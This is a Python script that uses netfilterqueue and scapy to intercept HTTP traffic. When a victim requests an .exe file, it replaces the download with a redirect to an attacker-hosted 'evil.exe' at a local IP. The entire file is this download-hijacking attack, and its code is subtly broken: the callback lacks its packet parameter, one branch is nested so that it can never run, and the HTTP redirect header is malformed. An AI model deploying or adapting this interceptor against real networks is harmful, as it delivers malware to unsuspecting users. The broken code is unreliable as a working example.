import netfilterqueue
import scapy.all as scapy


def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet



def process_packet():
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			if ".exe" in scapy_packet[scapy.Raw].load:
				print("[+] exe Requested")

				ack_list.append(scapy_packet[scapy.TCP].ack)

			elif scapy_packet[scapy.TCP].sport == 80:
				if scapy_packet[scapy.TCP].seq in ack_list:
					ack_list.remove(scapy_packet[scapy.TCP].seq)
					print("[+] Replacing file")
					modified_packet = set_load(scapy_packet, "HTTP/1.1 Move Permanently\n Location http://10.0.2.16/evil.exe\n\n")
					packet.set_payload(str(modified_packet))


ack_list = []
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()